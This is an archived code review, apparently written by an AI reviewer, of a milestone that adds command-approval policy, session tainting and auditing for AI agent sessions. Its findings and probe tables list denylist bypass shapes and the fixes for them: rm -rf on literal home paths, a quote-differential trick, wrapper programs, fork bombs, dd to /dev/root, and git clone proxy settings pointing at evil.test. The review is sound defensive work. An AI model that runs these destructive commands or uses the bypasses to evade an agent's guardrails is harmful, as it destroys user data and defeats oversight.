# M5 final review (archived 2026-10-13)

Opus whole-branch review of M5 after its rebase on M4, and its re-review after the fix dispatch, copied verbatim from the git-ignored SDD workspace. Ledger: [m5-sdd-ledger.md](m5-sdd-ledger.md).

# M5 final review — `feat/m5-policy` rebased on `main` (cc594a2..adb0a4d)

Reviewer: Opus, whole branch, read-only. 79 commits, 416 files. Reviewed in passes: rebase integrity (shared files, then a line-survival diff of both sides), cross-milestone semantics, end-to-end security, the three ledger carries (with probes run in the scratchpad against the real modules), owner-facing copy, hygiene, then the full gate.

## Gate (clean env, `.superpowers/bin` pnpm shim)

| Step | Result |
|---|---|
| lint, format:check, typecheck, knip | green |
| test:unit | 507 files, 6227 passed |
| `env -i HOME PATH CI=1 pnpm test:int` | 81 files, 401 passed, 1 skipped (`search.budget.int.test.ts`, gated by `PAP_BUDGET_RUN`; the scope tests ran and passed) |
| build, budgets, smoke | green; initial bundle 195.3 KB gzip (budget 200) |
| Commits | 79, all Conventional Commits, author Ubuntu, no `Co-Authored-By` / AI trailer |
| Files | no tracked code file over 400 lines; no literal bidi / zero-width character outside the plan docs and the pre-existing `spikes/` data |

## Strengths

- **The rebase is clean.** Every line M5 added before the rebase survives in the shared files, or was re-homed by name as agreement 5 asks (`link` → `policyLink` in `service-launch.ts` / `service-types.ts`; `oldestUserId` → M4's `firstUserId`). Every line M4 added on `main` survives too (checked with a line-survival diff against both merge bases, not only by reading). The only M5-only files the rebase changed are `cli.ts` (owner definition) and the new `daemon.adopted.int.test.ts`.
- **Agreement 8 is wired the right way.** `daemon.ts:186-190` runs `markTainted(owner, id, 0)` inside the adopting transaction (`scan-port.ts:108-113`). A throw rolls the adoption back, so it fails closed, and the int test proves both directions (adopted tainted, created not).
- **Shared files are faithful unions.** `MIGRATION_SOURCES` is passed as is and includes `PROJECTS_MIGRATIONS`. There is one `limit_reached`, with M4's wording and its web key. The snapshot carries `cwd`, `outsideWrite` and `policy`; the reducer handles all three. `forks.ts` runs `onMade`, then `inherit`, with `stored` set first; `service.ts` keeps `link.copy` for the fork's project. The i18n session chunk registers both catalogs.
- **Fail-closed holds where it matters.** Unknown stage outcomes throw. Only stage 01 may return `unchecked`. Null rules block. The 2 MiB grant-key cap runs before any stage. The dispatcher refuses a mutation it cannot receipt. A `secretResult` replay answers `conflict`. Token permissions are filtered through both `TOKEN_PERMISSIONS` and the owner's set at use time (`tokens.ts:141-144`). `requireStepUp` and `requireSessionAdmin` refuse every non-session caller.
- **The Origin rules are right everywhere.** `originGuard` covers every unsafe HTTP method on every route. On `/ws`, a present Origin is always checked; a cookie needs one; only a bearer may come without it; two `Authorization` headers answer 400.
- **Audit is append-only at the SQL level.** It refuses UPDATE, DELETE outside an open prune of an old month, and REPLACE. Prunes are themselves append-only.
- **Owner levers B and D work.** An unchecked command becomes a non-grantable Deny / Allow once question, only with a UI, in interactive mode, and not in read-only (`unchecked.ts`, `evaluate-once.ts:93-105`). The 52-command daily-use corpus passes with no `knownFriction` entry.
- **The stage-01 reader resists hostile spellings.** I ran about 230 hostile spellings against `denylistStage`: quoting, `$IFS`, wrappers, `sudo` option clusters, `-c` / `eval` / `su -c` / `ssh`, here-doc edge cases, `$(…)` with `)` inside quotes and `case`, comments, `${…}` with brackets, process substitution, redirections. Everything blocked except the shapes listed under I3 and M3 below.

## Issues

### Critical (must fix)

None.

### Important (should fix before merge)

**I1. Three events that M5R45 requires are not in the audit trail: successful sign-ins, owner creation over HTTP, and rule revocation.**
- Files:
  - `apps/daemon/src/modules/auth/service.ts:147-170` (`startSession`), `:234-268` (`setup`: `owner_created` is only a log line at `:262`), `:269-288` (`login`);
  - `apps/daemon/src/modules/auth/passkey-http.ts:129-157` (`login/verify`);
  - `apps/daemon/src/modules/policy/service.ts:159-164` (`revoke`);
  - `apps/daemon/src/modules/policy/index.ts:313-318` (`createPolicyService` gets no `audit` dep).
- What: M5R45 (plan l.2983, `m5-rulings.md:61`) lists "sign-ins that succeed (method, address), owner created, … a rule revoked" as audited. Only these are written: `step_up`, token, device and passkey events, `mode_changed`, `taint_cleared`, `settings_changed`, the CLI's `owner_created` and `credentials_reset`, and `pruned`. No test asserts the missing three, so every task review passed them.
- Why it matters: this is an access-control milestone, and the audit is its 12-month trail. A sign-in with a stolen password from another address leaves no lasting record: the device row goes on logout, revoke or expiry, and logs rotate. A revoked rule loses its history too. The Settings audit viewer also labels `auth` rows "Sign-in" (`settings-approvals.ts:102`), yet none can exist.
- Fix:
  - In `startSession`, append `{ ownerId: userId, actor: "user", kind: "auth", reason: "signed_in", detail: { method, ip } }`. That one place covers the password, passkey and setup sign-ins. `append` never throws (M5R47), and a sign-in needs a credential, so there is no flood.
  - In `setup`, append `owner_created` next to the log line.
  - Give `createPolicyService` the `audit` port. Pass the caller to `revoke` and append `{ kind: "policy", reason: "rule_revoked", detail: { ruleId, tool } }`.
  - Tests: an HTTP login and a passkey login each leave one `signed_in` row; `policy.revokeRule` leaves a `rule_revoked` row. Run each as a mutation check.

**I2. Sessions that M4 adopted before M5 is deployed never become tainted. The owner's preview home is in that state now.**
- Files: `apps/daemon/src/modules/policy/migrations/202610122010_session_policy.sql` (creates `session_policy` empty); `apps/daemon/src/daemon.ts:186-190` (only new adoptions are tainted).
- What: owner MQ3 and agreement 8 say adopted sessions start tainted. That holds only for files adopted after M5 boots. `pap-preview` was restarted on M4 at 02:22:41 UTC, 49 s after the M4 merge (`systemctl --user show pap-preview`). Since then its scanner has adopted every Pi session written after the install date, pi-web's and the CLI's included. After the M5 upgrade those rows have no `session_policy` row, so they read `tainted: false`. Their transcripts may hold unfenced external content, which is exactly what MQ3 was meant to flag. No textual conflict shows this; it is a deploy-order effect of "M4 first".
- Fix (cheap, this migration is not on `main` yet): taint every session that exists when the migration runs. Append to `202610122010_session_policy.sql`:
  `INSERT INTO session_policy (session_id, owner_id, tainted_at, updated_at) SELECT id, owner_id, CAST(strftime('%s','now') AS INTEGER) * 1000, CAST(strftime('%s','now') AS INTEGER) * 1000 FROM sessions;`
  - Adopted rows cannot be told apart from pap-created ones reliably, and nothing before M5 was fenced, so "all pre-M5 sessions" is the honest conservative reading. The cost is one Clear per old session the owner continues.
  - Add a migration test: a home with sessions migrated to M5 reads them all tainted.
  - Owner call: say it in the merge note. If the owner prefers not to taint pap-created sessions, the alternative is documenting the gap in `policy.md` residuals.

**I3. The catastrophic-command preset misses the most realistic catastrophe on this host: `rm -rf` of the home directory written as a literal path.**
- Files: `packages/pi-host/src/policy/denylist.ts:20-23` (`isRoot`, `rootLike`); copy at `apps/web/src/i18n/catalog/settings-approvals.ts:34` ("Recursive rm on the root or the home directory.") and `:154`.
- What (probed): these pass stage 01:
  - `rm -rf /home/ubuntu`, `rm -rf /home/ubuntu/`;
  - `rm -rf /home/*`, `rm -rf ~ubuntu`.
  
  These block: `rm -rf ~/`, `rm -rf $HOME`, `rm -rf "${HOME:?}"/`.
  
  M5R16 defines the target as "`~`, `$HOME` (any spelling of those)", and the absolute path is such a spelling. Models routinely expand `~` to the path they saw in `pwd`.
- Why it matters: the preset is "a floor for full access" (M5R16), and in full access a shell command is limited only by this list (owner Q1). This VPS has no sudo, so `rm -rf /` mostly fails on permissions, while `rm -rf /home/ubuntu` deletes everything that matters: `~/.pap`, `~/.pi`, the projects. The Settings copy promises the home directory is covered.
- Fix: compute the home spellings once at module load from `os.homedir()` (and `process.env.HOME` when it differs), squeezed. Have `rootLike` also accept `<home>`, `<home>/`, `<home>/*` and each ancestor of `<home>` with the same suffixes (`/home`, `/home/*`).
  - Add rows to `denylist.variants.test.ts`, with the home taken from a stubbed value so no test depends on the runner's home.
  - Check that `daily-use.test.ts` stays green; nothing in the corpus targets home.

### Minor (nice to have; none blocks the merge)

**M1. Carry (b), egress `git clone -c`: fix now (cheap) or accept. Recommendation: fix now if a round is open.**
- `egress.ts:149-161`: `gitScan` stops at the subcommand, so these pass with `allowHosts: ["github.com"]` (probed):
  - `git clone -c http.proxy=evil.test:80 https://github.com/a/b`;
  - `git clone --config http.proxy=…`;
  - `git clone --config=http.proxy=…`.
- Fix: for `clone`, keep scanning `-c` / `--config` / `--config=` after the subcommand through `isUnreadableSetting`, and add `url\.` to its expression (`/^(?:alias\.|url\.|[^=]*proxy=)/i`). An `insteadOf` written with `://` already blocks through URL extraction (probed); the scp-like base (`url.git@evil.test:.insteadOf=…`) does not.
- Not blocking: egress is off by default, and both residuals are already in `policy.md` and the Settings copy.

**M2. Carry (c), `isForkBomb` outside the step budget: accept.**
- It is linear. Measured worst case on this host: 0.30 s at 2 MiB and 0.59 s at 4 MiB, with `f(){ f|g& }` repeated. The grant key refuses inputs over 2 MiB before any stage (`grant-key.ts:10`), so 2 MiB is the real bound, and a model cannot emit that much in one tool call. `policy.md`'s "about 0.6 s at 2 MiB" is conservative.
- Optional one-liner: test `command.length > ROUGH_MAX_CHARS` before `isForkBomb` in the unreadable path.
- Side note: names bash accepts but the check does not (`.(){ .|.& };.`, `a.b(){ a.b|a.b& };a.b`) and the no-pipe form `f(){ f & f; }` pass. Document them or widen the name class.

**M3. Carry (a), other reader gaps: accept and document (plus one cheap hardening).**
- Reader differential (verified in bash 5.3: the trailing command runs): `echo "${x//'"'/}"; rm -rf /` passes. The reader closes the double quote inside `${…}` (`shell-words.ts:204-205`, `beUnsure`), then reads the rest as one unterminated single-quoted word.
  - Cheap hardening that adds no questions: when the reading was `unsure`, also run `roughBuiltinHit(command)` and block on a hit.
  - It is adversarial, not ordinary, and an attacker already has `c=rm; $c -rf /`, so accepting it with a doc line is also fine.
- Wrappers that are not stripped (all pass): `builtin command rm -rf /`, `pkexec`, `chrt -f 99`, `systemd-run --user`, `sg <group> -c '…'`. `builtin` is a one-word addition to `WRAPPERS` (`shell-argv.ts:29`) and `sg` belongs in `COMMAND_STRING_PROGRAMS` (`:13`); document the rest as a class.
- A target built by expansion (`rm -rf "$DIR"/*` with `DIR` unset, the Steam-bug shape) passes. The Settings copy covers it ("a target hidden in a variable"), but `policy.md`'s documented-pass list names only the command-word case. Add the target case.
- `dd of=/dev/root` passes (`DISK` in `denylist.ts:10`).

**M4. A token with `sessions:operate` can persist "always" rules, and the audit does not say who answered a card.**
- `sessions/service.ts:225-229` passes any caller's answer to `grants.answered`. A token answering `always` (or `session`) writes `approval_rules`. That is a policy write which outlives the token's revocation. The token UI says "Changing approval modes and rules needs your browser session." (`settings-access.ts:76`).
- The security delta is small: the rule is exact-call, it never applies while the session is tainted, and a token can answer `once` forever anyway (M5R64). Still, Q7(b)'s intent and the copy disagree with the code. The `approved` audit rows (actor `worker`) also cannot tell whether the browser or a token approved a call.
- Fix: offer token callers `deny` / `once` only (refuse `always` / `session` from `kind: "token"`), or correct the copy; record the answering credential (`actorId`) with the answer.

**M5. The token grid offers permissions that no method uses**: `policy:operate`, `sessions:admin`, `settings:admin`, `system:operate/admin`, `audit:operate/admin` (methods use only `system:read`, `sessions:read/operate`, `settings:read/operate`, `policy:read/admin`, `audit:read`). The cells are harmless but invite confusion. Hide them, or add a note.

**M6. The audit viewer label `audit.kind.auth` = "Sign-in" / "Connexion"** (`settings-approvals.ts:102`, `:223`) names rows that hold step-up, token, device and passkey events. Rename it "Access" / "Accès", whether or not I1 lands.

**M7. The full-access confirmation under-states the mode's limits.** `sessionPolicy.confirmFull` (`session-policy.ts:10`) says "except blocked commands and external content". Writes outside the project, protected paths and reads of pap's secrets still ask too, as the Settings copy says. Harmless (it promises less), but align it with `approvals.mode.full-access.limits`.

**M8. Owner question: a session continued outside pap is not tainted.** When M4's scanner sees an outside write (`scan-port.ts:70-75`, owner Q13), the Pi CLI may have fed the transcript unfenced external content, which is MQ3's reasoning. Raising the taint there is one line; it needs the owner's word because it extends MQ3.

**M9. Doc and ledger accuracy.**
- `docs/agents/sessions.md:88` still says "`onAdopted` wired to `markTainted` when the branches merge". It is wired now; line 64 says so correctly.
- `rebase-report.md` says the skipped int test is the scope test. It is `search.budget.int.test.ts` (the scope tests ran and passed under `CI=1`).

**M10. No headroom on file sizes:**
- `policy/extension.test.ts` 400/400;
- `auth/passkeys.test.ts` 395;
- `stores/session-reducer.test.ts` 395;
- `auth/service.test.ts` 392;
- `sessions/live-session.ts` 387.

The next edit to any of these needs a split first. Worth a line in M6's plan.

## Carries, verdicts

| Carry | Verdict |
|---|---|
| (a) Stage-01 adversarial gap hunt | **Fix now: I3** (literal home path, an ordinary shape). **Accept with docs: M3** (`${…}` quote differential, optionally hardened by a rough scan when unsure; extra wrappers; a target built by expansion; `/dev/root`). Everything else probed blocks or is a documented pass. |
| (b) `clone -c` / `--config`, `url\.` | **Fix now if cheap round available, else accept** (M1); it is already documented and egress is off by default. |
| (c) `isForkBomb` outside the step budget | **Accept** (M2): bounded by the 2 MiB grant-key cap, at most 0.3 s measured, linear. |

## Cross-milestone semantics checked

| Question | Finding |
|---|---|
| M4's adopted sessions tainted, and owner checks pass? | Yes for adoptions after M5 boots; `sessionOwner` = `ownerId()` = `firstUserId()` on both sides. **No for pre-M5 adoptions: I2.** |
| Tokens with `sessions:read` on `search.query` / `subscribe.shell` / `sessions.listArchived`? | Work as intended; every handler keys on `ctx.caller.userId`; the revoked-token 4401 drops the subscriptions. |
| New M4 methods outside the token grid? | None. `projects.update` and `sessions.mark` are `sessions:operate` mutations, the others are `sessions:read`; `TOKEN_PERMISSIONS` is derived by filter, so no method needs a grid change. |
| M4 mutations needing audit or step-up? | No ruling asks for either (M5R45 lists only auth and policy events). |
| `policy` view for cold, adopted sessions? | Read from `session_policy` with the row's owner; snapshot and `policy` event agree. |
| Forks and clones | `inherit` after `onMade`, the fork's project copied (M4 RT-20); a failing `inherit` removes the row, then the file. |

## Recommendations

- Land I1–I3 as one small fix round (≈ 1–1.5 h with tests), then re-run unit and int and smoke. M1 and M3's two one-word additions (`builtin`, `sg`) fit in the same round at almost no cost.
- Put I2's choice ("every pre-M5 session starts tainted") in the merge note to the owner, since the preview home is the one it affects.
- For M6 planning: the files with no headroom (M10), and a "who answered" audit field for cards once tokens are in real use (M4).

## Declined to judge

- Per-task Opus-reviewed internals (throttle tables, known-device HMAC, passkey ceremonies, redaction edges, the stage-07 fence format): spot-read only. Their own reviews probed them deeply, and nothing in the integration touches them.
- The browser rendering of the new Settings and session screens: headless host, and the owner checks the preview after the merge (decision 42).
- `pnpm test:budget`: not part of the requested gate; the rebase report ran it.
- The stale default-mode name in a cold session's header after a Settings change: `onSettingsChange` publishes only to tracked workers' rows. Cosmetic, corrected at the next snapshot.

## Assessment

**Ready to merge? With fixes.**

**Reasoning:** The rebase kept both sides' intent, every gate is green, and the security core (fail-closed pipeline, token and step-up limits, Origin rules, append-only audit, taint epochs) holds. Three small gaps should close first, because they hit the owner directly: the audit misses sign-ins and rule revocations that M5R45 requires (I1), the preview's M4-adopted sessions would come up untainted (I2), and a literal `rm -rf /home/ubuntu` passes the catastrophic preset (I3).

---

# Scoped re-review after the fix round (adb0a4d..e03c3ca, 9 commits)

Read-only. I read the diff (`review-adb0a4d..e03c3ca.diff`) and the fix report, re-ran my probes against the head in the scratchpad, ran the targeted tests and re-ran the full gate in a clean env. The fix report says "eight commits"; there are nine (nine `Ubuntu` commits, Conventional, no AI trailer, no literal bidi, no changed file over 385 lines).

## Verdicts

| Item | Verdict | Evidence |
|---|---|---|
| I1 audit events | **ADDRESSED** | `auth/service.ts:164-171` (`signed_in {method, ip}` in `startSession`, so password, passkey and setup); `:271` (`owner_created` on HTTP setup); `policy/service.ts:161-179` (`rule_revoked {ruleId, tool}`, actor `user`/`token` + `actorId`, append failure logged, revocation kept); `policy/index.ts:42` (audit port wired). Tests: `auth/sign-in.audit.test.ts`, `policy/service.audit.test.ts` (green). |
| I2 pre-M5 taint | **ADDRESSED** | `policy/migrations/202610122010_session_policy.sql:14-16`. See §5 below. Test `policy/migrations.taint.test.ts` (green). |
| I3 literal home | **ADDRESSED** | `denylist.ts:29-42` (`HOME_VARIABLE` adds `~user`; `HOME_PATHS` = `os.homedir()` and `$HOME` and each ancestor; suffixes `/`, `/.`, `/*`). Probed, see §2. Test `denylist.home.test.ts` (green). |
| M1 git clone settings | **ADDRESSED** | `egress.ts:150` (`url\.`), `:153-158` (`cloneDefinesSetting`), `:172`. Probed, see §2. |
| M2 fork-bomb bound | **ADDRESSED** | `denylist.ts:230` (size cap before `isForkBomb` on the unreadable path); `:130-132` (name class = any word without blanks or metacharacters). `.(){ .\|.& };.`, `a.b(){…}`, `function a-b {…}` now block; `f(){ f & f; }` stays a documented pass (`policy.md`). |
| M3 reader gaps | **ADDRESSED** | `shell-words.ts:138`, `:306-314` (`unsure` exposed); `denylist.ts:244-252` (rough scan backs an unsure reading, block only); `shell-argv.ts:41` (`builtin`), `:13` (`sg`); `denylist.ts:17` (`/dev/root`); `policy.md` documents `pkexec`/`chrt`/`systemd-run`, targets built by expansion and pipe-less fork bombs. |
| M4 token answers + answerer | **ADDRESSED** (with N1, N2 below) | `sessions/service.ts:24`, `:229-236` (token `always`/`session` → `forbidden` before the dialog is taken; answerer recorded); `policy-link.ts:36-40`, `:81-89`, `:170-186`; `audit/service.ts:43`, `:285-290`; contract `pi-host.ts:157`; `evaluate-once.ts:151`; `dialogs.ts:42`, `:205`. See §4. |
| M6 audit label | **ADDRESSED** | `settings-approvals.ts:102` "Access", `:223` "Accès". |
| M7 full-access confirm | **ADDRESSED** | `session-policy.ts:10`, `:38` now state that blocked commands stay blocked and that outside/protected writes, pap secret reads and post-external commands still ask. |
| M9 docs and ledger | **ADDRESSED** | `docs/agents/sessions.md:88` (wired, the pre-M5 taint, the token rule); `rebase-report.md:73` names `search.budget.int.test.ts`. `auth.md` and `policy.md` updated to match the code. |
| M5, M8, M10 | Deferred by the controller | M8 is an owner question; M10 is not made worse (no changed file near 400). |

## 2. Probes re-run at e03c3ca

| Probe | Result |
|---|---|
| `HOME=/home/tester`, `rm -rf /home/tester`, `…/`, `…/*`, `…//`, `"…"`, `sudo … /home/tester/.` | block (rm-root) |
| `rm -rf /home`, `/home/*`, `~ubuntu`, `~root/`, `~tester/*` | block |
| `rm -rf /home/tester/project`, `/home/tester/.cache`, `/homework`, `/home/other`, `./build`, `/tmp/x` | pass (no false positive) |
| Real home: `rm -rf /home/ubuntu`, `/home/ubuntu/`, `/home/ubuntu/*` | block |
| `git clone -c http.proxy=evil.test:80 https://github.com/a/b`, `--config …`, `--config=…`, `--depth 1 -c https.proxy=…` (with `allowHosts: ["github.com"]`) | block (host not checkable: git) |
| `-c url.git@evil.test:.insteadOf=https://github.com/` before or after `clone`; `pushInsteadOf` | block |
| `git clone https://github.com/a/b`, `--depth 1`, `-c core.autocrlf=false` | pass |
| `echo "${x//'"'/}"; rm -rf /` | block (rm-root, via the unsure rough scan) |
| `echo "${x:-"default"}"; ls` | pass (the common idiom gets no new friction) |
| `builtin command rm -rf /`, `builtin rm -rf /` | block |
| `sg docker -c 'rm -rf /'` | block |
| `dd if=/dev/zero of=/dev/root` | block (dd-device); `/dev/rootfs` passes |

New residuals, all Minor (N3): `sg docker 'rm -rf /'` passes, because `sg <group> <command>` without `-c` also runs its command. The unsure rough scan blocks quoted data that names a catastrophic shape in an unsure line (`echo "${x:-"d"}"; echo 'rm -rf / is bad'`). That is an accepted false positive in a rare shape.

## 3. Daily-use corpus and lever B

- `daily-use.corpus.ts`, `daily-use.test.ts` and `unchecked.ts` are untouched by the fix range. The corpus still has 52 commands with no `knownFriction`.
- `daily-use.test.ts`, `unchecked.test.ts` and `unchecked.padding.test.ts` pass, run with the 10 new test files (13 files, 354 tests).
- The only pipeline change on the lever-B path is the size check before `isForkBomb` in the unreadable branch (`denylist.ts:230`). Over 4 MiB it blocks (that input is already refused by the 2 MiB grant-key cap); at or below 4 MiB the behaviour is unchanged. The unsure rough scan only adds blocks, never questions. **Lever B is unchanged.**

## 4. M4 review

- **Consistency with ADR 0022 and the viewer.**
  - The viewer renders `actor · actorId` for every non-`worker` row (`AuditRow.tsx:153-158`), so an answered call row shows "user · <device id>" or "token · <token id>". That is consistent.
  - ADR 0022 and the `daemon.md` / `policy.md` audit bullets do not say that a call row's actor can now be the answering credential while its content (stages, args, decision) is still the worker's report. Only `sessions.md:88` says it.
  - The implementer flagged this as a deviation, with a one-line alternative (keep `actor: worker`, put the answerer in `actorId`). → **N1**, Minor.
- **Spoofing.**
  - The answerer's identity comes from the transport-stamped `Caller` (`service.ts:236`), never from the worker, so no worker can invent an answerer or name a credential that did not answer.
  - An older worker sends no `toolCallId`, so no answerer is recorded and the row stays `actor: worker` (graceful).
  - A rogue worker controls only the linkage. It can label its question with tool-call id X, then report a different call under X. That moves one real answer onto another call row of the same session, once (the map is keyed by session and tool-call id, taken once, capped at 1 024). It cannot cross sessions or reuse an answer.
  - A rogue worker could already write any worker row, so the capability is small. It is worth one sentence in ADR 0022 (part of N1).
- **The token refusal is enforced daemon-side.** `sessions/service.ts:231-232` throws `forbidden` for a `kind: "token"` caller whose response carries `answer` outside `{deny, once}`, before `session.answer` takes the dialog. Tested in `service.answers.test.ts` (refusal, card kept open, browser `always` still works). `confirmed` / `cancelled` responses map to once or deny, never to a grant.
- **N2 (Minor, a new fail-closed regression).**
  - `evaluate-once.ts:151` sends the raw `event.toolCallId`, but the contract caps it at 256 (`pi-host.ts:157`). A call whose id is longer now produces an `approval_request` the daemon's schema refuses (probed: 257 characters fails). Per `sessions.md:80` that becomes `approval_request_invalid`, answered deny/cancelled, so such a call can never be approved. Before this range it was asked normally.
  - The audit entry uses the clipped `ids.toolCallId`, so even a valid but different spelling would not match.
  - Realistic provider ids are well under 256 characters (about 30 to 80), so the effect is theoretical. The fix is one line: `toolCallId: ids.toolCallId`.

## 5. I2 migration

- **Owner ids.** Each row's `owner_id` is the session's own (`SELECT id, owner_id FROM sessions`). The test covers two owners, and a cross-owner read returns nothing.
- **No conflicting duplicates.**
  - The `INSERT` runs right after `CREATE TABLE session_policy` in the same migration, on an empty table, one row per session (primary key).
  - A later `markTainted` on such a row is a no-op (`WHERE tainted_at IS NULL`).
  - `clearTaint` lowers it and raises the epoch to 1, so a stale worker report of epoch 0 is then ignored, as designed.
  - `inherit` keeps `COALESCE(tainted_at, …)`.
- **Epoch 0.** `taint_epoch` takes its default of 0, asserted in the test (`taintEpoch: 0`).
- **Sessions created after the migration have no row** and read untainted until adopted (scan port → `markTainted`) or forked from a tainted source. Asserted (`new1` undefined).
- **Timestamps.** `tainted_at` and `updated_at` come from SQLite's clock (seconds × 1000). That is fine for a one-time migration (informational).
- **N4 (note for the merge).** Editing `202610122010` in place changes its checksum. A home that applied the earlier M5 version refuses to start ("migration file changed after it was applied"). Only dev homes of this worktree can be in that state: the preview home has never run M5. Recreate them, as the plan already says for dev homes.

## 6. Gate (clean env, head e03c3ca)

| Step | Result |
|---|---|
| lint, format:check, typecheck, knip | green |
| test:unit | 517 files, 6323 passed |
| `env -i HOME PATH CI=1 pnpm test:int` | 81 files, 401 passed, 1 skipped (`search.budget.int.test.ts`, `PAP_BUDGET_RUN`) |
| build, budgets, smoke | green; initial bundle 195.3 KB gzip (budget 200); smoke ok |

## Remaining items (all Minor, none blocking)

- **N1:** document the call-row actor in ADR 0022 and the `daemon.md` audit bullet: the answering credential, with content still the worker's report, plus the one-use linkage a rogue worker can move. Or keep `actor: worker` with `actorId`.
- **N2:** `evaluate-once.ts:151`: send `ids.toolCallId` (clipped), not the raw id. One line, plus a test with a 300-character id that is still asked and matched.
- **N3:** document `sg <group> <command>` without `-c`, and the unsure-scan false positive on quoted catastrophic text.
- **N4:** merge note: recreate dev homes that applied the earlier `202610122010`.
- Still deferred: M5, M8 (owner question), M10.

## Assessment (re-review)

**Ready to merge? Yes.** N2 is worth taking as a one-liner if another commit goes in anyway.

**Reasoning:** I1–I3 and the seven Minors are fixed with tests that pin them, and my probes confirm the fixes at the head. The token-answer rule is enforced in the daemon, lever B and the 52-command corpus are unchanged, and the full gate is green in a clean env. The items left are a documentation gap (N1), a theoretical fail-closed edge (N2) and residual notes (N3, N4).
